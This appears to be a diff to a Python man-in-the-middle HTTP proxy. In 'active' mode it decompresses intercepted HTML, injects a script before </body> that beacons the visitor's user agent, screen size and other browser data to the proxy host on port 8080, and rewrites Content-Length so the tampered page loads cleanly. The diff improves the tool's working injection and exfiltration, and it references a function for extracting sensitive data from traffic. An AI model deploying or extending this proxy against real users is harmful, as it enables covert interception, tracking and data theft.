@@ -1,7 +1,21 @@
 import argparse
 import re
 import socket
+import zlib
+import gzip
+from io import BytesIO
 from urllib.parse import urlparse, parse_qs, unquote
+
+def decompress_response_if_needed(response_data, headers):
+    if 'Content-Encoding: gzip' in headers:
+        buf = BytesIO(response_data)
+        with gzip.GzipFile(fileobj=buf) as f:
+            decompressed_data = f.read().decode('utf-8', errors='ignore')
+        return decompressed_data
+    elif 'Content-Encoding: deflate' in headers:
+        decompressed_data = zlib.decompress(response_data).decode('utf-8', errors='ignore')
+        return decompressed_data
+    return response_data.decode('utf-8', errors='ignore')
 
 def extract_sensitive_info(data):
     # Define patterns for various types of sensitive information
@@ -57,9 +71,9 @@ def log_active_info(data):
 
 def inject_javascript(response, proxy_ip):
     print(proxy_ip)
-    js_code = f"""
+    js_code = """
     <script>
-        (function() {{
+         (function() {{
             var img = new Image();
             img.src = 'http://{proxy_ip}:8080/?user-agent=' + encodeURIComponent(navigator.userAgent) +
                          '&screen=' + encodeURIComponent(window.screen.width + 'x' + window.screen.height) +
@@ -68,13 +82,25 @@ def inject_javascript(response, proxy_ip):
         }})();
     </script>
     """
-    modified_response = re.sub(r"</body>", js_code + "</body>", response, flags=re.IGNORECASE)
+    js_code = js_code.format(proxy_ip=proxy_ip)
+    print("JavaScript code to be injected:\n", js_code)
+
     if "</body>" in response:
         modified_response = re.sub(r"</body>", js_code + "</body>", response, flags=re.IGNORECASE)
-        print("Injected JS code into response.")
+        modified_response = update_content_length(modified_response)
+        print("Modified response after injection:\n", modified_response[:500])  # Print for verification
+        return modified_response
     else:
-        print("No </body> tag found; Couldn't Inject")
-    return modified_response
+        print("No </body> tag found; skipping JavaScript injection.")
+        return response
+
+def update_content_length(response):
+    content_length_match = re.search(r"Content-Length: (\d+)", response)
+    if content_length_match:
+        body_start = response.find("\r\n\r\n") + 4
+        new_length = len(response[body_start:].encode('utf-8'))
+        response = re.sub(r"Content-Length: \d+", f"Content-Length: {new_length}", response)
+    return response
 
 def handle_client(client_socket, mode, proxy_ip):
     # Receive client request
@@ -186,37 +212,48 @@ def handle_client(client_socket, mode, proxy_ip):
         elif mode == "active" and destination_ip == proxy_ip:
             log_active_info(request)
 
-        # Forward request to the actual destination for all other cases
-        forward_request(client_socket, destination_ip, destination_port, request, mode, proxy_ip)
-    else:
-        print("Invalid or unsupported request.")
-        client_socket.close()
+        try:
+            response = forward_request(client_socket, destination_host, destination_port, request)
+            print("Fetched response from the server:\n", response[:500])  # Print first 500 characters for verification
 
-def forward_request(client_socket, destination_ip, destination_port, request, mode, proxy_ip):
+            if "Content-Type: text/html" in response:
+                if mode == "active":
+                    modified_response = inject_javascript(response, proxy_ip)
+                    client_socket.sendall(modified_response.encode('utf-8', errors='ignore'))
+                elif mode == "passive":
+                    log_passive_info(response)
+            else:
+                print("Non-HTML content detected, sending original response.")
+                client_socket.sendall(response.encode('utf-8', errors='ignore'))
+        except Exception as e:
+            print(f"Error handling client request: {e}")
+        finally:
+            client_socket.close()
+
+def forward_request(client_socket, destination_ip, destination_port, request):
     """Forward the request to the actual destination and return the response."""
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        server_socket.connect((destination_ip, destination_port))
-        server_socket.send(request.encode('utf-8'))
+    server_socket.connect((destination_ip, destination_port))
+    server_socket.sendall(request.encode('utf-8'))
 
-        # Receive and forward response in chunks to handle large responses
-        while True:
-            response = server_socket.recv(4096)
-            if len(response) == 0:
-                break  # Exit loop when no more data is received
+    response_data = b""
 
-            if mode == "active":
-                response_decoded = response.decode('utf-8', errors='ignore')
-                response_with_js = inject_javascript(response_decoded, proxy_ip)
-                client_socket.send(response_with_js.encode('utf-8'))
-            else:
-                # Send the response back to the client exactly as received
-                client_socket.send(response)
-    except ConnectionRefusedError:
-        print(f"Connection to refused.")
-    finally:
-        client_socket.close()
-        server_socket.close()
+    # Receive and forward response in chunks to handle large responses
+    while True:
+        chunk = server_socket.recv(4096)
+        if not chunk:
+            break
+        response_data += chunk
+    server_socket.close()
+    # Split headers and body
+    header_end = response_data.find(b"\r\n\r\n") + 4
+    headers = response_data[:header_end].decode('utf-8', errors='ignore')
+    body = response_data[header_end:]
+
+    # Decompress if necessary
+    body = decompress_response_if_needed(body, headers)
+
+    return headers + body
 
 def start_proxy(ip, port, mode):
     proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
